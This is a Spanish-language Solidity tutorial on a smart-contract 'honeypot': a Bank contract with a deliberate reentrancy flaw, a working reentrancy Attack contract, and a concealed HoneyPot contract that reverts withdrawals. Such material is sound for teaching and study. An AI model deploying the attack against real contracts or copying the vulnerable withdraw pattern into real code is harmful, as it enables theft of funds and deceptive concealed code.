TRAMPA PARA HACKERS // HONEYPOT

VULNERABILIDAD
Combinando dos exploits, reentrada y ocultación de código malicioso, podemos construir un contrato.
que atrapará a los usuarios malintencionados.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

EJEMPLO DEL CONTRATO:
Bank es un contrato que llama a Logger para registrar eventos.
Bank.withdraw() es vulnerable al ataque de reentrada.
Entonces un hacker intenta drenar Ether del banco.
Pero en realidad el exploit de reentrada es un cebo para los hackers.
Al implementar Bank con HoneyPot en lugar del Logger, este contrato se convierte en
una trampa para los piratas informáticos. Veamos cómo.
// PASO A PASO

1. Alice despliega HoneyPot.
2. Alice Despliega Bank con la dirección de HoneyPot.
3. Alice deposita 1 Ether en Bank.
4. Eve descubre el exploit de reentrada en Bank.withdraw y decide hackearlo.
5. Eve despliega un ataque con la dirección de Bank.
6. Eve llama a Attack.attack() con 1 Ether pero la transacción falla.

¿Qué pasó?
Eve llama a Attack.attack() y comienza a retirar Ether del banco.
Cuando el último Bank.withdraw() está a punto de completarse, llama a logger.log().
Logger.log() llama a HoneyPot.log() y revierte. La transacción falla.

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(address _caller, uint _amount, string memory _action) public {
        emit Log(_caller, _amount, _action);
    }
}
// El hacker intenta drenar los Ethers almacenados en el banco mediante reentrada.

contract Attack {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Digamos que este código está en un archivo separado para que otros no puedan leerlo.
contract HoneyPot {
    function log(address _caller, uint _amount, string memory _action) public {
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    // Function to compare strings using keccak256
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}

